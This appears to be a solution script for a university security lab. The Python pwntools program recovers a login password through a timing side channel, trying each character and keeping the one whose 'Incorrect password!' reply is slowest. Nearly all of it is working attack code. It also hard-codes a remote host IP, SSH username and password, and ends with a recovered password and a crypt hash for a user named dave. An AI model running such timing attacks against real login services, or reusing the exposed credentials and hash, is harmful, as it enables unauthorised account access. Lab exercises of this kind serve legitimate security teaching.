from pwn import *
import time
import statistics

# context.log_level = True

REMOTE_HOST = '141.223.181.16'
REMOTE_USER = 'csed415-lab04'
REMOTE_PORT = 7022
SSH_PASSWORD = '2979cfed'

HOST = 'localhost'
PORT = 10004
USERNAME = 'ubuntu'

TRIALS = 1        # 한 문자를 측정할 때 반복 횟수
MAX_LEN = 32      # 최대 비밀번호 길이

CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+{}[]<>?~,.|"

def measure_attempt(prefix: str) -> float:
    durations = []
    for _ in range(TRIALS):
        try:
            conn = remote(HOST, PORT)
        except:
            return 20
            
        # login prompt
        # conn.recvuntil(b'login:')
        start = time.perf_counter()
        conn.sendline(prefix.encode())

        try:
            conn.recvuntil(b'Incorrect password!', timeout=20)
        except:
            conn.close()
            return 20
            
        end = time.perf_counter()

        durations.append(end - start)
        conn.close()

    # 통계적으로 노이즈 제거
    return statistics.mean(durations)

def recover_password():
    recovered = ''
    
    for pos in range(MAX_LEN):
        tmp_time_set = dict()
        best_char = None
        best_time = -1.0

        # 각 문자 시도하여 응답 시간 측정
        for c in range(256):
            c = chr(c)
            guess = recovered + c
            t = measure_attempt(guess)
            tmp_time_set[c] = t
            
            if t > best_time:
                best_time = t
                best_char = c

        recovered += best_char
        print(f"[{pos+1:02d}] Found: '{best_char}' (avg {best_time:.6f}s)")
        print(tmp_time_set)

    print("Recovered password:", recovered)


if __name__ == '__main__':
    recover_password()
    
# result = "F0r7uNe_f4V0r5_the_|3R4veJ"
# dave:$5$RByrWzKkQroXD$jgzSfKmMS/O.6pP0TEIZitkB.gUSqEy5s1vLoklivU5